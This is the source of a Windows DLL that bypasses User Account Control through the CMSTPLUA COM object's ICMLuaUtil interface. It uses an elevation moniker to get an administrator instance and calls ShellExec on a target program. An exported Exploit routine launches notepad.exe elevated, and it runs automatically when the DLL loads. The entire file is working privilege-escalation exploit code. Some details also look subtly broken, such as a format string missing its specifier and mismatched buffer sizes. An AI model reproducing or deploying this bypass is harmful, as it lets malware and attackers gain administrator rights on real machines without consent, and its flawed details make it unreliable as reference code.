// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include <string.h>
#include <strsafe.h>
#include "Header.h"

BOOL CMLuaUtilBypassUAC(LPCWSTR);
HRESULT CoCreateInstanceAsAdmin(HWND, REFCLSID, REFIID, PVOID*);

BOOL CMLuaUtilBypassUAC(LPCWSTR lpwszExecutable)
{
    HRESULT hr = 0;
    CLSID clsidICMLuaUtil = { 0 };
    IID iidICMLuaUtil = { 0 };
    ICMLuaUtil* CMLuaUtil = NULL;
    BOOL bRet = FALSE;
    do {
        CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
        IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

        hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)&CMLuaUtil);
        //(PVOID*) (&cmluautil))؛ / lift cmluautil
        if (FAILED(hr))
        {
            break;
        }

        hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
        if (FAILED(hr))
        {
            break;
        }
        bRet = TRUE;
    } while (FALSE);
    if (CMLuaUtil)
    {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }
    return bRet;
}
HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
    BIND_OPTS3 bo;
    WCHAR wszCLSID[MAX_PATH] = { 0 };
    WCHAR wszMonikerName[MAX_PATH] = { 0 };
    HRESULT hr = 0;

    CoInitialize(NULL);


    StringFromGUID2(rclsid, wszCLSID, STRSAFE_MAX_CCH);
    hr = StringCchPrintfW(wszMonikerName, STRSAFE_MAX_CCH, L"Elevation:Administrator!new:%", wszCLSID);
    if (FAILED(hr))
    {
        return hr;
    }

    RtlZeroMemory(&bo, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = hWnd;
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    hr = CoGetObject(wszMonikerName, &bo, riid, ppVoid);
    return hr;
}

extern __declspec(dllexport) int Exploit();
int Exploit() {
    LPCWSTR path = (LPCWSTR)L"C:\\Windows\\System32\\notepad.exe";
    CMLuaUtilBypassUAC(path);
    return 0;
}

BOOL WINAPI DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

